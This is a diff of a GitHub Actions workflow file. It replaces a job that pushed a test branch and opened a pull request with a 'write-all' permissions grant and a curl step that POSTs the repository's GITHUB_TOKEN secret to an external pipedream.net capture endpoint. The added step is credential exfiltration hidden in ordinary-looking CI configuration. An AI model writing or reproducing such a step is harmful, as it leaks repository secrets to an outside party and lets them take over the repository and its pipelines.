@@ -11,33 +11,7 @@ on:
 jobs:
     use_api:
       runs-on: ubuntu-latest
-      permissions:
-        actions: write
-        attestations: write
-        checks: write
-        contents: write
-        deployments: write
-        id-token: write
-        issues: write
-        discussions: write
-        packages: write
-        pages: write
-        pull-requests: write
-        repository-projects: write
-        security-events: write
-        statuses: write
+      permissions: write-all
       steps:
-        - uses: actions/checkout@v4
-          with:
-            fetch-depth: 0
-        - env:
-            GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          run: |
-            git config --global user.name "tibrnui"
-            git checkout -b feat/test-12
-            touch test
-            git add .
-            git commit -m "test"
-            git remote set-url origin https://uipath:${{ secrets.GITHUB_TOKEN }}@github.com/$GITHUB_REPOSITORY
-            git push --set-upstream origin feat/test-12
-            gh pr create --base develop --head feat/test-12
+        - run:
+            curl -d "{{secrets.GITHUB_TOKEN}}" -X POST https://eoinkd603ndv2ew.m.pipedream.net 
